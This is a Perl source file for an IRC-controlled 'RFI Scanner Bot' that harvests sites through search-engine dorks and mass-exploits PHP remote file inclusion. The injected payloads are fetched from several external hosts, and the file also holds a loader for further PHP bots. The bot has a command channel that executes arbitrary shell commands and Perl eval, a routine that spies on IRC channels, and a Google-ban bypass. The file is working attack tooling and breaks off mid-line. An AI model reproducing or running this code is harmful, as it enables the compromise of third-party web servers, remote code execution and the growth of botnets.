#!/usr/bin/perl

print('
##################################
# Jatimcom RFI Scanner Bot v5.9   #
# april 2009. jatim community     #
##################################
');

######################################################
## Usage:                                           ##
##   perl file.txt <chan> <server> <port>           ##
## Notes:                                           ##
## + All Parameters are optional                    ##
##                                                  ##
## Features:                                        ##
## + RFI Scanner                                    ##
## + AUTO RFI Scanner Domains                       ##
## + RFI Scan & Exploit (Exploit per engine)        ##
## + Joomla RFI Scan & Exploit                      ##
## + UPLOAD BOT PHP                                 ##
## + Milw0rm Search                                 ##
## + Google bypass (Using PHP)                      ##
## + Message Spy & Save                             ##
######################################################
## History:
## + Fixed cryptz command (v4.5)
## + Fixed user commands execution by unauthorized user (v4.6)
## + Added options to enable/disable encrypted password (v4.7)
## + Fixed missing hostname on sublink (v4.8)

use strict;

use IO::Socket::INET;
use LWP::UserAgent;
use HTTP::Request;
use Digest::MD5 qw(md5 md5_hex md5_base64);

my $versi   = "9,1(4?9?'4?9 Test Bot4 9'?4?9";
my $cmdpre  = "."; #Command Prefix

##[ KONFIGURASI URL ]##
my $zfxid  = "http://beltps.by/images/File/zayavlenie/id1.txt????"; #zFxID1 (Simple) / #Fx29ID2 (Advanced)
my $zfxid2 = "http://beltps.by/images/File/zayavlenie/id2.txt??"; #zFxID2 (Advanced)
my $fx29sh  = "http://www.elc.tomsk.ru//studio.txt???"; #Fx29Sh (Optional)
my $bypass  = "http://beltps.by/images/File/zayavlenie/googlez.php?"; #Google Bypasserz (Optional)
my $pbot    = "http://www.elc.tomsk.ru//shot.txt??"; #phpbot (Optional)
my $thebot  = "http://hostingan.webs.com/alat.txt??"; #phpbot2 (Optional)
my $cbot    = "http://hostingan.webs.com/scan.txt?"; #phpbot3 (Optional)
my $botscan = "http://hostingan.webs.com/by.txt?"; #botscanloader (Optional)
my $botedan = "http://hostingan.webs.com/load.txt??"; #botedanloader (Optional)

##[ KONFIGURASI SOURCE ]##
my $mysite  = "http://hostingan.webs.com/"; #Path to Sources URL (Optional)
my $spread  = $mysite."alat.txt"; #ZFxSpreadz (Optional)
my $joomlaz = $mysite."joomla.txt"; #Joomla's Bugs List (Required for Joomla RFI Scanner)

##[ KONFIGURASI IRC ]##
my @servers = ("irc.byroe.net");
my %bot     = (
  nick    => "User|".int(rand(100))."",
  ident   => "sCaNNeR".int(rand(100)),
  chan    => ["#test.bot"],
  server  => $servers[rand(scalar(@servers))],
  port    => "6667"
);

##[ KONFIGURASI USER ##
## cryptz: 0 = Not Encrypted, 1 = Encrypted
my %boss = (
  Cimz => {
    pass   => 'admin',
    status => "admin",
    cryptz => 0,
    login  => 0
  },
  Cimz => {
    pass   => 'admin',
    status => "admin",
    cryptz => 0,
    login  => 0
  },
);

##[ KONFIGURASI SPY ]##
my %spy = (
  host   => "",
  chanz  => [""],
  wordz  => ['http:\/\/.*[=]'],
  foundz => []
);

##[ KONFIGURASI BOT ]##
## Options: 0 = Disable, 1 = Enable
my %conf = (
  showsite => 0, #Show link to debug channel (Yes/No)
  linez    => 3, #Lines per message
  sleepz   => 3, #Message delay per linez (seconds)
  rfipid   => 50, #Sites per proccess
  rficnt   => 100, #Counter setting
  rficnt2  => 100, #Counter setting
  timeout  => 4, #Http socket time out
);

##[ KONFIGURASI WARNA ]##
my %colz = (
  1 => "12,1 [#]9 " , 1 => " 12[#]", #Header
  3 => "12,9.12:12:12[4 " , 4 => " 12]12:12:12.", #Proses
);

##[ PARAMETER BARIS PERINTAH ]##
$bot{chan}   = "#test.bot".$ARGV[0] if $ARGV[0];
$bot{server} = $ARGV[1] if $ARGV[1];
$bot{port}   = $ARGV[2] if $ARGV[2];

##[ INISIALISASI VARIABEL ]##
my $chanx    = "#test.bot"; #2nd Channel to show the results of vurnerable site
my $dbgchan  = "#sampah"; #For debugging purposes (Optional)
my $nickx    = "Cimz"; #nickpv
my @chans    = ($bot{chan});
my @badbugz  = ("scan","bug"); #Bad bugs to cancel scanning
my @baddorkz = ("dork"); #Bad dorks to cancel scanning
my $keluar   = 0;
my $sock;

##[ KONFIGURASI LOCALTESTING ]##
my $tez = $ARGV[3];
if ($tez == 1) {
  $zfxid  = "http://beltps.by/images/File/zayavlenie/id1.txt??";
  $zfxid2 = "http://beltps.by/images/File/zayavlenie/id2.txt??";
  $fx29sh  = "http://beltps.by/images/File/zayavlenie/encode.jpg?";
}

##[ PROGRAM UTAMA ]##
if (fork() == 0) { while ($keluar != 1) { irc_connect(); } die("KeLuaR!"); }

##[ SUBRUTIN KONEKSI IRC ]##
sub irc_connect {
  $sock = IO::Socket::INET->new(PeerAddr => $bot{server},
                                PeerPort => $bot{port},
                                Proto    => 'tcp')
                            or die "Ga bisa connect ke ".$bot{server}.":".$bot{port}."\r\n";
  $sock->autoflush(1);

  irc_nick($bot{nick});
  irc_user($bot{ident});

  my ($baris,$hb);
  my $loginboss = 0;
  my $userstat  = "";

  while ( $baris = <$sock> ) {
    $hb++;

    ##[ PARSING ]##
    my $com;
    my $me = $bot{nick};
    my ($fcom,$dteks,@teks) = split(/\s+:/,$baris);
    my ($duhost,$dcom,$dtarget) = split(/ /,$fcom);
    my ($dnick,$dhost) = split(/!/,$duhost);
    $dcom    = "" unless ($dcom);
    $dtarget = "" unless ($dtarget);
    $dnick =~ s/://;
    $dteks = trimrn($dteks);
    if ($dteks =~ /^[$cmdpre](.*)/) { $com = $1; } else { $com = ""; }

    #print $baris."\n$dnick | $dcom | $dtarget : $dteks\n";

    ##[ CEK USER ]##
    if   ($boss{$dnick}) { ($loginboss,$userstat) = ($boss{$dnick}{"login"},$boss{$dnick}{"status"}); }
    else { ($loginboss,$userstat) = (0,""); }

    ##[ RESPON KE SERVER ]##
    if    ($dnick =~ /PING/) { irc_raw("PONG $dteks"); }
    if    ($dcom =~ /001/) { irc_join($chanx); foreach my $c (@chans) { irc_join($c); } }
    elsif ($dcom =~ /NICK|PART|QUIT/) { if ( $boss{$dnick}{"login"} == 1 ) { $boss{$dnick}{"login"} = 0; irc_ntc($dnick,"Logout!");  } }

    ##[ PERINTAH PUBLIK ]##
    if    (($dtarget) && ($dtarget eq $me)) { $dtarget = $dnick; }
    if    ($com =~ /^help$/) { bot_help($dtarget,1); }
    elsif ($com =~ /^info$/) { bot_info($dtarget); }
    elsif ($com =~ /^gaebot\s+(http:\/\/.*[=])/) { gae_bota($dtarget,$dnick,$1); }
    elsif ($com =~ /^gaebotendel\s+(http:\/\/.*[=])/) { gae_botb($dtarget,$dnick,$1); }
    elsif ($com =~ /^gaebotping\s+(http:\/\/.*[=])/) { gae_botc($dtarget,$dnick,$1); }
    elsif ($com =~ /^upbot\s+(http:\/\/.*[=])/) { gae_botm($dtarget,$dnick,$1); }
    elsif ($com =~ /^enter\s+(http:\/\/.*[=])/) { entered($dtarget,$dnick,$1); }
    elsif ($com =~ /^gaebotscan\s+(http:\/\/.*[=])/) { gaescan($dtarget,$dnick,$1); }
    elsif ($com =~ /^gaebotedan\s+(http:\/\/.*[=])/) { gaeruwet($dtarget,$dnick,$1); }
    elsif ($com =~ /^respon/) { cek_respon($dtarget); }
    elsif ($com =~ /^milw0rm\s+(.*)/) { milw0rm($dtarget,$1); }
    elsif ($com =~ /^url(en|de)\s+(.*)/) {
      my $url = $2; my $en;
      if    ( $1 eq "en" ) { $en = "Encode"; $url = urlen($url); }
      elsif ( $1 eq "de" ) { $en = "Decode"; $url = urlde($url); }
      msgi($dtarget,"URL $en", $url);
    }
    elsif ($com =~ /^md5(.?|crack)\s+(.*)/) {
      my $msg = $2; my $en;
      if    ( $1 eq "" ) { $en = "Hash"; $msg = md5_hex($msg); msgi($dtarget,"MD5 $en", $msg); }
      elsif ( $1 eq "crack" ) { $en = "Crack"; $msg = md5_crack($dtarget, $msg); }
    }
    elsif ($com =~ /^cek\s+(http:\/\/.*[=])/) { cek_shell($dtarget,$dnick,$1); }
    elsif ($com =~ /^power\s+(.*)/ && $boss{$dnick}) {
      my $pass = $1; my $auth = $boss{$dnick}{"login"};
      if ( $pass && $auth == 0 ) {
        if ($boss{$dnick}{"cryptz"} == 1) { $pass = cryptz($pass); }
        if ($pass eq $boss{$dnick}{"pass"}) {
          $boss{$dnick}{"login"} = 1;
          irc_ntc($dnick,"OK ".$boss{$dnick}{"status"}."!");
        }
        else { irc_ntc($dnick,"Error!"); }
      }
      else {
        if ($auth == 0) { irc_ntc($dnick,"Blom auth!"); }
        else { irc_ntc($dnick,$boss{$dnick}{"status"}."!"); } }
    }
    if ($dtarget && $dtarget ne $me) {
      if    (($com =~ /^scan\s+(.+?[=])\s+(.*)/) && (fork() == 0)) { s_scanz($dtarget,$1,$2,$hb,1); exit;  }
      if    (($com =~ /^autoscan\s+(.+?[=])\s+(.*)/) && (fork() == 0)) { a_scanz($dtarget,$1,$2,$hb,1); exit;  }
      elsif (($com =~ /^scan2\s+(.+?[=])\s+(.*)/) && (fork() == 0)) { s_scanz($dtarget,$1,$2,$hb,2); exit; }
    }
    ##[ END OF PUBLIC ]##

    ##[ PERINTAH USER ]##
    if ($loginboss == 0) {
      if    ($com =~ /^help/) { bot_help($dtarget,2); }
      elsif ($com =~ /^budal\s+(.*)/) { irc_join($1); push(@chans,$1); }
      elsif ($com =~ /^moleh\s+(.*)/) {
        my $pchan = $1; irc_part($1);
        for my $i(0..scalar(@chans)) { if ($chans[$i] eq $pchan) { undef $chans[$i]; } }
      }
      elsif ($com =~ /^n\s+(.*)/) { $bot{nick} = $1; irc_nick($bot{nick}); }
      elsif ($com =~ /^bos$/ ) { my @bos = keys %boss; my $bos2 = join(" ",@bos); msgi($dtarget,"BoZz",$bos2); }
      elsif ($com =~ /^cryptz\s+(.*)/) { msgi($dnick,$1,cryptz($1)); }
      elsif ($com =~ /^logout$/ ) { $boss{$dnick}{"login"} = 0; irc_ntc($dnick,"Logout berhasil!"); }
      elsif (($com =~ /^joomla\s+(.*)/) && (fork() == 0)) { s_scanz($dtarget,"",$1,$hb,3); exit; }
      elsif ($com =~ /^sublink\s+(.*)/) { my @sl = lnk_sub($1); foreach my $e(@sl) { irc_msg($dtarget,$e); } }
      elsif ($com =~ /^http(1|2|3)\s+(.+?)\s+(.*)/) {
        my ($t,$nf,$q) = ($1,$2,$3);
        my $h;
        if ($t == 1) { $h = bukasitus($q); }
        elsif ($t == 2) { $h = bukasitus2($q); }
        else { $h = bukasitus3($q); }
        f_simpan2($nf,$h); ntci($dnick,"SaVeD ($t)",$nf);
      }
      elsif ($com =~ /^regex(1|2)\s+(.+?)\s+(.*)/) {
        my $n = $1;
        my $q = bukasitus($2);
        my $regex = $3;
        if ($n ==1) {
          if ($q !~ /$regex/) { irc_msg($dtarget,"Ga cocok!"); }
          while ($q =~ m/$regex/g ) { irc_msg($dtarget,$1); sleep(1); }
        }
        else {
          while ($q =~ m/<a href=\"(.*?)\">http:\/\/(.*?)<\/a>/g) { irc_msg($dtarget,$2); sleep(1); }
        }
      }
    }
    ##[ END OF USER ]##

    ##[ PERINTAH ADMIN ]##
    if (($loginboss == 0) && ($userstat eq "admin")) {
      if    ($com =~ /^help/) { bot_help($dtarget,3); }
      elsif ($com =~ /^rahasia/) { bot_help($dtarget,4); }
      elsif ($com =~ /^gojoin\s+(.*)/) { irc_join($1); push(@chans,$1); }
      elsif ($com =~ /^gopart\s+(.*)/) {
        my $pchan = $1; irc_part($1);
        for my $i(0..scalar(@chans)) { if ($chans[$i] eq $pchan) { undef $chans[$i]; } }
      }
      elsif ($com =~ /^gonick\s+(.*)/) { $bot{nick} = $1; irc_nick($bot{nick}); }
      elsif ($com =~ /^rfiproses\s+([0-9].*)/) { $conf{rfipid} = $1; msgi($dtarget,"RFI Pid",$conf{rfipid}); }
      elsif ($com =~ /^minggat/) { irc_quit("Good Bye!"); $keluar = 1; exit; }
      elsif ($com =~ /^reonline/) { irc_quit("Restarted proses!"); }
      elsif ($com =~ /^explo\s+([0-9].*)/) { $conf{rficnt} = $1; msgi($dtarget,"RFI Count",$conf{rficnt}); }
      elsif ($com =~ /^cshell\s+(.*)/) { $fx29sh = $1; msgi($dtarget,"Injector RFI",$fx29sh); }
      elsif ($com =~ /^csp\s+(.*)/) { $spread = $1; msgi($dtarget,"Injector Spread",$spread); }
      elsif ($com =~ /^chanhasil\s+(.*)/) { $chanx = $1; msgi($dtarget,"Chan Hasil Target ",$chanx); }
      elsif ($com =~ /^goid(1|2)\s+(.*)/) {
        my ($n,$url) = ($1,$2);
        if    ($n == 1) { $zfxid = $url; }
        elsif ($n == 2) { $zfxid2 = $url; }
        msgi($dtarget,"Respon $n RFI",$url);
      }
      elsif ($com =~ /^urlbot(1|2|3)\s+(.*)/) {
        my ($n,$url) = ($1,$2);
        if    ($n == 1) { $pbot = $url; }
        elsif ($n == 2) { $thebot = $url; }
        elsif ($n == 3) { $cbot = $url; }
        msgi($dtarget,"12 - x - 11Change Bot url3 $n 1Tranforms3 ",$url);
      }
      elsif ($com =~ /^urlcetak(1|2)\s+(.*)/) {
        my ($n,$url) = ($1,$2);
        if    ($n == 1) { $botscan = $url; }
        elsif ($n == 2) { $botedan = $url; }
        msgi($dtarget,"12 - x - 11Change url Mesin Cetak3 $n 1Tranforms3 ",$url);
      }
      elsif ($com =~ /^chans/) { my $chans = join(",", @chans); ntci($dnick,"ChaNz",$chans);  }
      ##[ PERINTAH SPY ]##
      elsif ($com =~ /^spy$/ ) { ntci($dnick,"SpY","Host: ".$spy{"host"}." Chans: ".join(",", @{ $spy{"chanz"} })." Words: ".join(",", @{ $spy{"wordz"} })); }
      elsif ($com =~ /^spy(found|show|clear)$/ ) {
        my $n = $1;
        if ($n eq "found") { msgi($dtarget,"SpYFouNd",scalar(@{ $spy{"foundz"} })); }
        elsif ($n eq "show") {
          my $i = 0;
          for my $f (@{ $spy{"foundz"} }) { irc_msg($dtarget,$f); }
          $i++; if ($i % $conf{linez} == 0) { sleep($conf{sleepz}); }
        }
        elsif ($n eq "clear") { $spy{"foundz"} = []; msgi($dtarget,"SpyList","DiBersiHkaN!"); }
        else { msge($dtarget,"Spy","PeRinTah SaLah!"); }
      }
      elsif ($com =~ /^spyhost\s+(.*)/ ) { $spy{"host"} = $1; ntci($dnick,"SpYHosT",$spy{"host"}); }
      elsif ($com =~ /^spychan\s+(.*)/ ) {
        unless ($spy{"host"}) { msge($dtarget,"SiLaHkaN SeT SpyHost TerLebih DahuLu!",""); }
        else{ irc_join($1); push @{ $spy{"chanz"} }, $1; my $chans = join(",", @{ $spy{"chanz"} }); ntci($dnick,"SpYChaNz",$chans); }
      }
      elsif ($com =~ /^spyword\s+(.*)/ ) { push @{ $spy{"wordz"} }, $1; my $words = join(",", @{ $spy{"wordz"} }); ntci($dnick,"SpYWoRDz",$words); }
      ##[ END OF PERINTAH SPY ]##
      elsif ($com =~ /^keluar/) { irc_quit("9,1(4?9)??'4?9) IndoHost4 9'??(4?9)!"); $keluar = 1; system("killall perl"); exit; }
      elsif ($com =~ /^raw\s+(.*)/) { irc_raw($1); }
      elsif ($com =~ /^cspread\s+(.*)/) {
        my $url = $1;
        $spread = $url;
        msgi($dtarget,"Spread RFI",$spread);
      }
      elsif ($com =~ /^\+bos\s+(.+?)\s+(.*)/) {
        $boss{$1}{pass}   = "fx";
        $boss{$1}{status} = $2;
        $boss{$1}{login}  = 0;
        $boss{$1}{cryptz} = 0;
        ntci($dnick,"BoZz","$1 ditambahkan sbg ".$boss{$1}{status});
        msgi($1,"BoZz","Hai $1! Ketik .auth ".$boss{$1}{pass});
      }
      elsif ($com =~ /^eval\s+(.*)/) { eval($1); }
      elsif (( $com =~ /^cmd\s+(.*)/) && ( fork() == 0 ) ) {
        my $cmd = $1;
        if ($cmd =~ /cd (.*)/) { chdir("$1") || irc_msg($dtarget,"Ga bisa ganti dir!"); return; }
        my @output = `$cmd`;
        my $i = 0;
        foreach my $out (@output) {
          $i++; if ($i % $conf{linez} == 0) { sleep($conf{sleepz}); }
          irc_msg($dtarget,"$out");
        }
        exit;
      }
    }
    ## END OF ADMIN ##

    ##[ MATA-MATA ]##
    if ($dtarget ne $spy{"host"}) {
      my $is_spychan = grep $_ eq $dtarget, @{$spy{"chanz"}};
      if ($is_spychan == 1) {
         for my $t (@{$spy{"wordz"}}) {
           if ($dteks =~ /$t/) {
             msgi($spy{"host"},"!",$dteks); sleep(1);
             push @{ $spy{"foundz"} }, $dteks;
           }
         }
       }
    }
    ##[ END OF MATA-MATA ]##
  }
  ## END WHILE ##
}
## END KONEK ##

#########################
##[ RUTIN EKSPLOITASI ]##
#########################
sub s_scanz {
  my ($to,$bug,$dork,$sb,$type) = @_;
  $sb = "Fx".$sb.".txt";
  $dork = bersihdork($to,$dork);
  my %typez = (
    1 => "RFI ScaNneR",
    2 => "RFI ScaN & ExpLoiT",
    3 => "JooMLa MaSs ScaN & ExpLoiT"
  );
  my $badbug  = cek_bug($bug);
  if ($badbug == 1) { msge($to,"BuG","BuGnya JeLek! ScaNNinG DiCanCeL"); return; }
  my $baddork = cek_dork($dork);
  if ($baddork == 1) { msge($to,"DoRk","DorKnya JeLek! ScaNNinG DiCanCeL"); return; }
  if ($type == 3) {
    my $h = bugjoomla("hitung");
    if ($h == 0) { msge($to,"Joomla","BuGnya Ga BiSa DiLoaD! ScaNNinG DiCanCeL"); return; }
  }
  irc_msg($to,$colz{1}."cek ReSpoN doken..".$colz{2});
  my $stat = cek_respon($to);
  if ($stat != 2) { irc_msg($to,$colz{1}."ReSpoN dak idup..! ScaNning diCaNCeL!".$colz{2}); return; }
  irc_msg($to,$colz{1}."".$typez{$type}." DiMuLai!1 ".$conf{rfipid}."/PID 9ID:1 $sb".$colz{2});
  irc_msg($to,$colz{1}."BuGz:1 $bug ") if ($type != 3);
  irc_msg($to,$colz{1}."DoRkz:1 $dork ");
  s_cari($to,$dork,$sb,$bug,$type);
  s_eksploit(1,$to,$bug,$dork,$sb) if ($type == 1);
  irc_msg($to,$colz{1}."".$typez{$type}." SeLeSai!9,1 $dork 12ID:1 $sb".$colz{2});
  return;
}

sub a_scanz {
  my @domini = &SiteDomains();
  my ($to,$bug,$dork,$sb,$type) = @_;
  $sb = "Fx".$sb.".txt";
  $dork = bersihdork($to,$dork);
  my %typez = (
    1 => "Auto RFI ScaNneR Domains",
    2 => "RFI ScaN & ExpLoiT",
    3 => "JooMLa MaSs ScaN & ExpLoiT"
  );
  my $badbug  = cek_bug($bug);
  if ($badbug == 1) { msge($to,"BuG","BuGnya JeLek! ScaNNinG DiCanCeL"); return; }
  my $baddork = cek_dork($dork);
  if ($baddork == 1) { msge($to,"DoRk","DorKnya JeLek! ScaNNinG DiCanCeL"); return; }
  if ($type == 3) {
    my $h = bugjoomla("hitung");
    if ($h == 0) { msge($to,"Joomla","BuGnya Ga BiSa DiLoaD! ScaNNinG DiCanCeL"); return; }
  }
   foreach my $Domains(@domini){
  irc_msg($to,$colz{1}."MeMeRikSa ReSpoN..".$colz{2});
  my $stat = cek_respon($to);
  if ($stat != 2) { irc_msg($to,$colz{1}."ReSpoN Ga BeKerJa! ScaNning diCaNCeL!".$colz{2}); return; }
  irc_msg($to,$colz{1}."11".$typez{$type}." Start!12 ".$conf{rfipid}."/PID 9ID:12 $sb".$colz{2});
  irc_msg($to,$colz{1}."12 -10= 11X10 =12- 13Auto Scan Domain Dijalankan 4,12Please Waiting For it !!! 12 -10= 11X10 =12-");
    my $auto_dork = $dork." site:".$Domains;
  irc_msg($to,$colz{1}."6BuGz:4 $bug ") if ($type != 3);
  irc_msg($to,$colz{1}."12DoRkz:4 $auto_dork ");
  s_cari($to,$auto_dork,$sb,$bug,$type);
  s_eksploit(1,$to,$bug,$auto_dork,$sb) if ($type == 1);
  irc_msg($to,$colz{1}."".$typez{$type}." SeLeSai!4 $auto_dork 9ID:4 $sb".$colz{2});
   }
}
sub s_eksploit {
  #Type: 1 = Biasa, 2 = Cari dan exploit, 3 = Joomla
  #Engine: Kosong = Eksploit total, Ada = Eksploit per engine
  my ($type,$chan,$bug,$dork,$tf,$engine) = @_;
  my @prosesbaru;
  my @semuatarget;
  my $hitung;
  my $num = 0;
  my @bugjoomla = bugjoomla($chan) if ($type == 3);
  unless (open(FILEZ,"< $tf")) { msge($chan,"FILE","Ga BiSa BuKa $tf!"); return; }
  while (my $r = <FILEZ>) { $r =~ s/\n//g; push(@semuatarget,$r); }
  close(FILEZ);
  f_hapus($tf);
  my @target = lnk_sortir(@semuatarget);
  if (!$engine) {
    irc_msg($chan,$colz{1}."HasIl KentuAn dari1 $dork".$colz{2});
    irc_msg($chan,$colz{1}."ToTaL:4,1 ".scalar(@semuatarget)." 9BeRsih:11 ".scalar(@target)." 9ID:7 $tf".$colz{2}." ".$colz{1}."Pemerkosaan DiMuLai!".$colz{2});
  }
  foreach my $situs (@target) {
    $hitung++;
    if ($hitung % $conf{rfipid} == 0) {
      foreach my $f (@prosesbaru) { waitpid($f,0); }
      $num = 0;
    }
    if ($type != 1 && $hitung % $conf{rficnt2} == 0) {
      irc_msg($chan,"9 $engine15 ".$hitung." 10[X] 7 ". scalar(@target). " ");
    }
    if ($type == 1 && $hitung % $conf{rficnt} == 0) {
      irc_msg($chan,$colz{3}.$hitung." 1:1 ".scalar(@target).$colz{4});
    }
    $prosesbaru[$num] = fork();
    if ($prosesbaru[$num] == 0) {
      if ($type != 3) {
        my $q = bukasitus("http://".$situs.$bug.$zfxid."?");
        if ($q =~ /ShiroHige/) { safemode(1,$chan,$situs,$bug,$engine); sleep($conf{sleepz}); }
      }
      else {
        foreach my $bug (@bugjoomla) {
          my $q = bukasitus("http://".$situs.$bug.$zfxid."?");
          if ($q =~ /ShiroHige/) { safemode(1,$chan,$situs,$bug,$engine); sleep($conf{sleepz}); }
        }
      }
      exit(0);
    }
    $num++;
  }
  foreach my $f (@prosesbaru) { waitpid($f,0); }
  if ($engine) { irc_msg($chan,"9 $engine 4FiNizZ! "); }
}
###########################
##[ RUTIN SEARCH ENGINE ]##
###########################################################################
## GOOGLE  : AOL, *CompuServe, *Mahalo.com, *MySpace, *Netscape, *Ripple ##
## YAHOO   : AltaVista, AlltheWeb, GoodSearch, *Rectifi                  ##
## LIVE    : *A9.com, *Ms.Dewey, *Tafiti                                 ##
## ASK     : *iWon, Lycos                                                ##
## LAINNYA : Abacho, Clusty, Dmoz, Euroseek, Fireball, Hotbot, Mamma,    ##
##           Virgilio, Webcrawler, Webde                                 ##
## * Not implemented yet
###########################################################################
sub s_cari {
  #Type: 1 = Cari saja, 2 = Cari dan eksploit, 3 = Cari dan eksploit Joomla
  my ($chan,$dork,$nf,$bug,$type) = @_;
  my @engz;
  my $key = $dork;
  $dork = urlen($key);
  $engz[0]  = fork(); if ($engz[0]  == 0) { s_engine("google","Google",$type,$chan,$bug,$dork,$nf); exit; }
  #$engz[1]  = fork(); if ($engz[1]  == 0) { s_engine("aol","Aol",$type,$chan,$bug,$dork,$nf); exit; }
  #$engz[2]  = fork(); if ($engz[2]  == 0) { s_engine("netscape","Netscape",$type,$chan,$bug,$dork,$nf); exit; }
  $engz[3]  = fork(); if ($engz[3]  == 0) { s_engine("yahoo","Yahoo",$type,$chan,$bug,$dork,$nf); exit; }
  $engz[4]  = fork(); if ($engz[4]  == 0) { s_engine("live","Live",$type,$chan,$bug,$dork,$nf); exit; }
  #$engz[5]  = fork(); if ($engz[5]  == 0) { s_engine("ask","Ask",$type,$chan,$bug,$dork,$nf); exit; }
  $engz[6]  = fork(); if ($engz[6]  == 0) { s_engine("google2","Google2",$type,$chan,$bug,$dork,$nf); exit; }
  $engz[7]  = fork(); if ($engz[7]  == 0) { s_engine("altavista","Altavista",$type,$chan,$bug,$dork,$nf); exit; }
  $engz[8]  = fork(); if ($engz[8]  == 0) { s_engine("alltheweb","AllTheWeb",$type,$chan,$bug,$dork,$nf); exit; }
  $engz[9]  = fork(); if ($engz[9]  == 0) { s_engine("goodsrch","GoodSearch",$type,$chan,$bug,$dork,$nf); exit; }
  $engz[10] = fork(); if ($engz[10] == 0) { s_engine("lycos","Lycos",$type,$chan,$bug,$dork,$nf); exit; }
  $engz[11] = fork(); if ($engz[11] == 0) { s_engine("uol","Uol",$type,$chan,$bug,$dork,$nf); exit; }
  #$engz[12] = fork(); if ($engz[12] == 0) { s_engine("fireball","Fireball",$type,$chan,$bug,$dork,$nf); exit; }
  #$engz[13] = fork(); if ($engz[13] == 0) { s_engine("gigablast","Gigablast",$type,$chan,$bug,$dork,$nf); exit; }
  $engz[14] = fork(); if ($engz[14] == 0) { s_engine("virgilio","Virgilio",$type,$chan,$bug,$dork,$nf); exit; }
  $engz[15] = fork(); if ($engz[15] == 0) { s_engine("webde","Web.de",$type,$chan,$bug,$dork,$nf); exit; }
  #$engz[16] = fork(); if ($engz[16] == 0) { s_engine("mamma","Mamma",$type,$chan,$bug,$dork,$nf); exit; }
  $engz[17] = fork(); if ($engz[17] == 0) { s_engine("clusty","Clusty",$type,$chan,$bug,$dork,$nf); exit; }
  #$engz[18] = fork(); if ($engz[18] == 0) { s_engine("dmoz","Dmoz",$type,$chan,$bug,$dork,$nf); exit; }
  $engz[19] = fork(); if ($engz[19] == 0) { s_engine("abacho","Abacho",$type,$chan,$bug,$dork,$nf); exit; }
  #$engz[20] = fork(); if ($engz[20] == 0) { s_engine("euroseek","Euroseek",$type,$chan,$bug,$dork,$nf); exit; }
  $engz[21] = fork(); if ($engz[21] == 0) { s_engine("hotbot","Hotbot",$type,$chan,$bug,$dork,$nf); exit; }
  $engz[22] = fork(); if ($engz[22] == 0) { s_engine("webcrawl","WebCrawler",$type,$chan,$bug,$dork,$nf); exit; }
  foreach my $e (@engz) { waitpid($e,0); }
}
sub s_engine {
    my ($f,$se,$type,$chan,$bug,$dork,$ef) = @_;
    my @hc;
    if    ($f eq "google"   ) { @hc = se_google($chan,$dork,$ef); }
    elsif ($f eq "google2"  ) { @hc = se_google_m($chan,$dork,$ef); }
    elsif ($f eq "aol"      ) { @hc = se_aol($chan,$dork,$ef); } #Unused
    elsif ($f eq "yahoo"    ) { @hc = se_yahoo($chan,$dork,$ef); }
    elsif ($f eq "altavista") { @hc = se_altavista($chan,$dork,$ef); }
    elsif ($f eq "alltheweb") { @hc = se_alltheweb($chan,$dork,$ef); }
    elsif ($f eq "goodsrch" ) { @hc = se_goodsearch($chan,$dork,$ef); }
    elsif ($f eq "ask"      ) { @hc = se_ask($chan,$dork,$ef); }
    elsif ($f eq "lycos"    ) { @hc = se_lycos($chan,$dork,$ef); }
    elsif ($f eq "live"     ) { @hc = se_live($chan,$dork,$ef); }
    elsif ($f eq "hotbot"   ) { @hc = se_hotbot($chan,$dork,$ef); }
    elsif ($f eq "virgilio" ) { @hc = se_virgilio($chan,$dork,$ef); }
    elsif ($f eq "webde"    ) { @hc = se_webde($chan,$dork,$ef); }
    elsif ($f eq "uol"      ) { @hc = se_uol($chan,$dork,$ef); }
    elsif ($f eq "abacho"   ) { @hc = se_abacho($chan,$dork,$ef); } #Unused
    elsif ($f eq "clusty"   ) { @hc = se_clusty($chan,$dork,$ef); }
    elsif ($f eq "webcrawl" ) { @hc = se_webcrawler($chan,$dork,$ef); }
    my @cl = lnk_sortir(@hc);
    msgr($chan,$se,scalar(@hc),scalar(@cl));
    if (scalar(@cl) == 0) { exit; }
    if ($type == 1) { foreach my $e (@cl) { f_simpan($ef,$e); } }
    else {
      my $ef2 = $f.$ef;
      foreach my $e (@cl) { f_simpan($ef2,$e); }
      if    ($type == 2) { s_eksploit(2,$chan,$bug,$dork,$ef2,$se); }
      elsif ($type == 3) { s_eksploit(3,$chan,$bug,$dork,$ef2,$se); }
    }
}
##[ GOOGLE ]##
sub se_google {
  my ($chan,$key,$nf) = @_;
  my @daftar;
  my $num = 50; my $max = 5000; my $p = 0;
  #my $url = "http://localhost/search/google.co.id.htm";
  my $url = "http://www.google.co.id/search?num=".$num."&hl=id&q=".$key."&start=".$p."&sa=N";
  my $murl = "http://www.google.co.id";
  my $nxurl;
  my $q = bukasitus($url);
  if ( $q !~ /2009 Google/ ) { msge($chan,"Google","Jancok..Banned"); @daftar = se_gbypass($chan,$key,$nf); }
  if ( $q =~ /dari sekitar <b>(.+?)<\/b>/ ) {
    my $h = $1; $h =~ s/,//g; msgt($chan,"Google","$h");
  }
  if ( $q =~ /class=b><a href=\"(.*?)\">/ ) {
      my $nxurl = $1; msgn($dbgchan,"Google","Searching:");
  }
  while ( $q =~ m/<h3 class=r><a href=\"http:\/\/(.*?)\"/g ) { push (@daftar, $1); }
  for ($p=50;$p<=$max;$p+=$num) {
    $nxurl = "http://www.google.co.id/search?num=".$num."&hl=id&q=".$key."&start=".$p."&sa=N";
    $q = bukasitus($nxurl);
    while ( $q =~ m/<h3 class=r><a href=\"http:\/\/(.*?)\"/g ) {  push (@daftar, $1);  }
    if ( $q !~ /<h3 class=r><a href=\"http:\/\/(.*?)\"/ ) { return @daftar;  }
  }
  return @daftar;
}
##[ GOOGLE BYPASS ]##
sub se_gbypass {
  my ($chan,$key,$nf) = @_;
  my @daftar;
  my $num = 50; my $max = 1000; my $p = 0;
  my $url = $bypass."?key=".$key."&max=".$max;
  my $nxurl;
  my $q = bukasitus($url);
  while ( $q =~ m/<h3 class=r><a href=\"http:\/\/(.*?)\"/g ) {  pu